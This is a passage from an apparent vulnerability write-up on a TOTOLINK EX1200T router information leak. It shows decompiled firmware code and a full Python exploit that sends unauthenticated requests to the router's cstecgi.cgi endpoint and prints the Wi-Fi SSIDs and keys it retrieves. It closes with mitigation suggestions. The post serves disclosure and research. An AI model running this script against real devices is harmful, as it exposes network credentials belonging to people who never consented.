  cJSON_AddItemToObject(uVar1,"apcliSsid",uVar3);
  uVar3 = getAuthMode(&amp;local_210);
  uVar3 = cJSON_CreateString(uVar3);
  cJSON_AddItemToObject(uVar1,"apcliAuthMode",uVar3);
  uVar3 = getEncrypType(&amp;local_210);
  uVar3 = cJSON_CreateString(uVar3);
  cJSON_AddItemToObject(uVar1,"apcliEncrypType",uVar3);
  uVar3 = getWirelessKey(&amp;local_210);
  uVar3 = cJSON_CreateString(uVar3);
  cJSON_AddItemToObject(uVar1,"apcliKey",uVar3);
  getWlBssInfo(&amp;local_210,auStack_58);
  sprintf((char *)&amp;local_118,"%02X:%02X:%02X:%02X:%02X:%02X",(uint)local_55,(uint)local_54,
          (uint)local_53,(uint)local_52,(uint)local_51,(uint)local_50);
  uVar3 = cJSON_CreateString(&amp;local_118);
  cJSON_AddItemToObject(uVar1,"apcliBssid",uVar3);
  iVar2 = getRepeaterStatus(&amp;local_210);
  if (iVar2 == 1) {
    uVar3 = cJSON_CreateString("success");
    cJSON_AddItemToObject(uVar1,"apcliStatus",uVar3);
  }
  else {
    uVar3 = cJSON_CreateString(&amp;DAT_000218e4);
    cJSON_AddItemToObject(uVar1,"apcliStatus",uVar3);
  }
  SetWlan_idx(&amp;local_238);
  __ptr = (void *)cJSON_Print(uVar1);
  websGetCfgResponse(param_1,param_3,__ptr);
  free(__ptr);
  cJSON_Delete(uVar1);
  return 0;
}
</code></pre></div></div>

<p>If we requested this function in the panel we can see the results clearly as the following:</p>

<p><img src="/assets/images/bcf7303ec21af422b4cb82958c1a330c" alt="" /></p>

<p>Now, Let’s write a python code to exploit both functions and retrieve the leaked important information:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import requests
import sys
from json import *

def getWiFiApConfig(target):
    url = f"http://{target}/cgi-bin/cstecgi.cgi"
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0", "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Origin": f"http://{target}", "DNT": "1", "Connection": "close", "Referer": f"http://{target}/ap.asp?timestamp=1679528272527"}
    json={"topicurl": "setting/getWiFiApConfig"}
    r = requests.post(url, headers=headers, json=json)
    data = loads(r.text)
    print("=========================================")
    print("[+] Access Point Information")
    print("SSID:", data["ssid"])
    print("Key:", data["key"])
    print("[+] 5G Access Point Information")
    print("SSID:", data["ssid5g"])
    print("Key:", data["key5g"])

def getWiFiApInfo(target):
    url = f"http://{target}/cgi-bin/cstecgi.cgi"
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0", "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Origin": f"http://{target}", "DNT": "1", "Connection": "close", "Referer": f"http://{target}/ap.asp?timestamp=1679528272527"}
    json={"topicurl": "setting/getWiFiApInfo"}
    r = requests.post(url, headers=headers, json=json)
    data = loads(r.text)
    print("=========================================")
    print(f"[+] Access Point {data['ssid1']}")
    print("Key:", data["wifiKey1"])
    print("Status:", data["wifiOff1"])
    print("BSSID:", data["bssid1"])
    print(f"[+] Access Point {data['ssid2']}")
    print("Key:", data["wifiKey2"])
    print("Status:", data["wifiOff2"])
    print("BSSID:", data["bssid2"])
    print(f"[+] Access Point {data['ssid3']}")
    print("Key:", data["wifiKey3"])
    print("Status:", data["wifiOff3"])
    print("BSSID:", data["bssid3"])

target = sys.argv[1]
method = int(sys.argv[2])

if method == 1:
    print(f"[*] Target: {target}  Method: getWiFiApConfig")
    getWiFiApConfig(target)
elif method == 2:
    print(f"[*] Target: {target}  Method: getWiFiApInfo Status: (0 Means on/ 1 Means off)")
    getWiFiApInfo(target)
else:
    print("[-] Invalid Method number")
</code></pre></div></div>

<p>Our code will take 2 parameters the target <code class="language-plaintext highlighter-rouge">IP</code> address and a <code class="language-plaintext highlighter-rouge">method</code> number (1 for <code class="language-plaintext highlighter-rouge">getWiFiApConfig</code> or 2 for <code class="language-plaintext highlighter-rouge">getWiFiApInfo</code>), Then It checks the method number and calls the appropriate function for each method. The <code class="language-plaintext highlighter-rouge">getWiFiApConfig</code> function retrieves the configuration information for both <code class="language-plaintext highlighter-rouge">2.4G</code> and <code class="language-plaintext highlighter-rouge">5G</code> Access Points, including <code class="language-plaintext highlighter-rouge">SSID</code> and <code class="language-plaintext highlighter-rouge">key</code> by sending a <code class="language-plaintext highlighter-rouge">POST</code> request to the target’s <code class="language-plaintext highlighter-rouge">/cgi-bin/cstecgi.cgi</code> with the <code class="language-plaintext highlighter-rouge">topicurl</code> parameter set to <code class="language-plaintext highlighter-rouge">setting/getWiFiApConfig</code>. After that parsing the <code class="language-plaintext highlighter-rouge">JSON</code> data in the response to retrieve the <code class="language-plaintext highlighter-rouge">SSID</code> and the <code class="language-plaintext highlighter-rouge">key</code>. The <code class="language-plaintext highlighter-rouge">getWiFiApInfo</code> function retrieves information for multiple access points, including <code class="language-plaintext highlighter-rouge">SSID</code>, <code class="language-plaintext highlighter-rouge">key</code>, <code class="language-plaintext highlighter-rouge">status</code> and <code class="language-plaintext highlighter-rouge">BSSID</code> by sending a <code class="language-plaintext highlighter-rouge">POST</code> request to the target’s <code class="language-plaintext highlighter-rouge">/cgi-bin/cstecgi.cgi</code> with the <code class="language-plaintext highlighter-rouge">topicurl</code> parameter set to <code class="language-plaintext highlighter-rouge">setting/getWiFiApInfo</code>. After that parsing the <code class="language-plaintext highlighter-rouge">JSON</code> data in the response to retrieve the <code class="language-plaintext highlighter-rouge">SSID</code>, <code class="language-plaintext highlighter-rouge">key</code>, <code class="language-plaintext highlighter-rouge">status</code> and <code class="language-plaintext highlighter-rouge">BSSID</code>.</p>

<p><img src="/assets/images/cb0df9ef0883925b945e887bde0f51cc" alt="" /></p>

<h1 id="final-thoughts"><strong>Final Thoughts</strong></h1>

<p>As mostly of the vulnerabilities in this device model, There is nothing checks if the user is logged in or no &amp; has a valid session or no, So, It must contain a function to operate all of this and check it. Another thing is not to retrieve the <code class="language-plaintext highlighter-rouge">keys</code> of the <code class="language-plaintext highlighter-rouge">APs</code> until the user click on show password.</p>

<h1 id="conclusion"><strong>Conclusion</strong></h1>

<p>As we saw the functions that are responsible for retrieving the Access Points information and type of information each one bring to the device panel &amp; how it’s done, Also we wrote a code to exploit it and automate this process. Finally, The root cause and highlighted some suggestions to mitigate it.</p>

<p> </p>

<h2 id="references"><strong>References</strong></h2>

<ul>
  <li>
    <p><a href="https://www.totolink.net/home/news/me_name/id/39/menu_listtpl/DownloadC.html">https://www.totolink.net/home/news/me_name/id/39/menu_listtpl/DownloadC.html</a></p>
  </li>
  <li>
    <p><a href="https://github.com/p1Kk/vuln/blob/dcc2b75ab49f8cb0bdadf6f3c5d6b379a73e57c5/totolink_ex1200t_getWiFiApConfig_leak.md">https://github.com/p1Kk/vuln/blob/dcc2b75ab49f8cb0bdadf6f3c5d6b379a73e57c5/totolink_ex1200t_getWiFiApConfig_leak.md</a></p>
  </li>
  <li>
    <p><a href="https://github.com/p1Kk/vuln/blob/6b28edd65b7c2ce7d70d0aac8decd96ac50e5182/totolink_ex1200t_getWiFiApInfo_leak.md">https://github.com/p1Kk/vuln/blob/6b28edd65b7c2ce7d70d0aac8decd96ac50e5182/totolink_ex1200t_getWiFiApInfo_leak.md</a></p>
  </li>
  <li>
    <p>https://ghidra-sre.org/</p>
  </li>
  <li>
    <p><a href="https://github.com/scriptingxss/owasp-fstm/releases/download/v1.0/Firmware_Security_Testing_Methodology_Version1.pdf">https://github.com/scriptingxss/owasp-fstm/releases/download/v1.0/Firmware_Security_Testing_Methodology_Version1.pdf</a></p>
  </li>
</ul>

        
      </section>

      <footer class="page__meta">
        
        


  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/categories/#iot-exploitation" class="page__taxonomy-item" rel="tag">IoT Exploitation</a>
    
    </span>
  </p>


        
          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2023-03-27T00:00:00+08:00">March 27, 2023</time></p>
        
      </footer>

      

      
  <nav class="pagination">
    
      <a href="/iot%20exploitation/CVE_2021_42886/" class="pagination--pager" title="CVE-2021-42886: TOTOLINK EX1200T Information disclosure vulnerability
">Previous</a>
    
    
      <a href="/iot%20exploitation/CVE_2021_42890/" class="pagination--pager" title="CVE-2021-42890: Hostime Remote Command Injection
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
  
</div>

    </div>

    
      <div class="search-content">
        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';">
    <label class="sr-only" for="search">
      Enter your search term...
    </label>
    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
  </form>
  <div id="results" class="results"></div></div>

      </div>
    

    <div id="footer" class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
  <ul class="social-icons">
    
      <li><strong>Follow:</strong></li>
    

    
      
        
      
        
      
        
      
        
      
        
      
        
      
    

    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
  </ul>
</div>

<div class="page__footer-copyright">&copy; 2024 Zeyad Azima. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>

      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>
  <script src="https://kit.fontawesome.com/4eee35f757.js"></script>




<script src="/assets/js/lunr/lunr.min.js"></script>
<script src="/assets/js/lunr/lunr-store.js"></script>
<script src="/assets/js/lunr/lunr-en.js"></script>







  </body>
</html>
